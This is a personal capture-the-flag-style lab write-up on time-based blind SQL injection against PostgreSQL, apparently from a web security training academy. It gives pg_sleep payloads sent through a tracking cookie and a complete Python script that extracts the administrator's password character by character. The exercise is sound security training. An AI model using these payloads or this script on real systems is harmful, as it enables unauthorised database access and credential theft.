---
topic: SQL injection
level: Practitioner
time_spent: 20 mins
Database type: PostgreSQL
---
**Vulnerability:** 
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

**Payload:**
```
'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

![](Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md_Attachments/Screenshot%20(85).png)

- Using this we determine if the conditional queries are working or not.
```
'%3B SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![](Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md_Attachments/Screenshot%20(86).png)
- We verify the user 'administrator'.
```
'%3B SELECT CASE WHEN (username='administrator' AND LENGTH(password) > 19) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
- Using this we find out the length of the password which we have done in the previous labs as well.
```
'%3B SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![](Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md_Attachments/-20261125.png)
- And as we have performed earlier using payloads we can figure out the password for this user.
- But we still use the python scripting for the task making it faster and easier.

```
import requests
from urllib.parse import quote

requests.packages.urllib3.disable_warnings()

URL = "https://0a92007f037662a78350fae200bf0038.web-security-academy.net/login"   # root page
BASE_TID = "us4ZdgOsovMZWCWn"
LENGTH = 20
DELAY = 5
THRESHOLD = 4.0          

def ask(condition):
    inner = (f"{BASE_TID}'%3B SELECT CASE WHEN ({condition}) "
             f"THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END FROM users--")
    # build the Cookie header by hand so the ; (%3B) survives:
    headers = {"Cookie": "TrackingId=" + quote(inner, safe="%")}
    r = requests.get(URL, headers=headers, verify=False)
    return r.elapsed.total_seconds() > THRESHOLD   

def find_char(pos):
    lo, hi = 48, 122                      
    while lo < hi:
        mid = (lo + hi) // 2
        cond = (f"username='administrator' "
                f"AND ASCII(SUBSTR(password,{pos},1)) > {mid}")
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

# known-true should be SLOW, known-false FAST
assert ask("username='administrator' AND 1=1"), "TRUE case didn't delay — check payload/URL"
assert not ask("username='administrator' AND 1=2"), "FALSE case delayed — threshold too low"
print("[+] Oracle OK (timing detected correctly)")

password = ""
for pos in range(1, LENGTH + 1):
    password += find_char(pos)
    print(f"[{pos}/{LENGTH}] {password}")

print(f"\n[+] administrator password: {password}")
```

![](Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md_Attachments/-20261125-1.png)
**What I learned:**

